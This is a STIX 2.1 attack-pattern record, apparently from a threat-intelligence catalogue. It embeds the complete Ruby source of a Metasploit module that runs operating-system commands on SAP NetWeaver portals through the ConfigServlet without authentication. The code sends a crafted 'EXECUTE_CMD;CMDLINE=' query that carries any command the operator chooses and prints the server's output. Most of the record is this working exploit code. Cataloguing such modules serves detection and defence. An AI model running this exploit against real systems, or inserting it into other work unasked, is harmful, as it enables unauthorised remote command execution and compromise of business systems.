{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dcef5e8c-53ac-4a5a-86ab-31026af1c1f3",
    "created": "2024-08-14T16:22:31.797518Z",
    "modified": "2024-08-14T16:22:31.797522Z",
    "name": "SAP ConfigServlet OS Command Execution",
    "description": " This module allows execution of operating system commands through the SAP ConfigServlet without any authentication. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/sap/sap_configservlet_exec_noauth.rb",
            "external_id": "sap_configservlet_exec_noauth.rb"
        },
        {
            "source_name": "reference",
            "url": "http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'SAP ConfigServlet OS Command Execution',\n      'Description'     => %q{\n          This module allows execution of operating system commands through the SAP\n        ConfigServlet without any authentication.\n      },\n      'Author'          =>\n        [\n          'Dmitry Chastuhin', # Vulnerability discovery (based on the reference presentation)\n          'Andras Kabai' # Metasploit module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'OSVDB', '92704' ],\n          [ 'EDB', '24963' ],\n          [ 'URL', 'http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf']\n        ],\n      'DisclosureDate' => '2012-11-01' # Based on the reference presentation\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(50000),\n        OptString.new('CMD', [ true, 'The command to execute', 'whoami']),\n        OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/ctc/servlet'])\n      ])\n  end\n\n  def run\n    begin\n      print_status(\"#{rhost}:#{rport} - Sending remote command: \" + datastore['CMD'])\n      uri = normalize_uri(target_uri.path, 'ConfigServlet')\n\n      res = send_request_cgi(\n        {\n          'uri' => uri,\n          'method' => 'GET',\n          'query' => 'param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=' + Rex::Text::uri_encode(datastore['CMD'])\n        })\n      if !res or res.code != 200\n        print_error(\"#{rhost}:#{rport} - Exploit failed\")\n        return\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} - Failed to connect to the server\")\n      return\n    end\n\n    if res.body.include?(\"Process created\")\n      print_good(\"#{rhost}:#{rport} - Exploited successfully\\n\")\n      print_line(\"#{rhost}:#{rport} - Command: #{datastore['CMD']}\\n\")\n      print_line(\"#{rhost}:#{rport} - Output: #{res.body}\")\n    else\n      print_error(\"#{rhost}:#{rport} - Exploit failed\")\n      vprint_error(\"#{rhost}:#{rport} - Output: #{res.body}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-11-01 # Based on the reference presentation"
}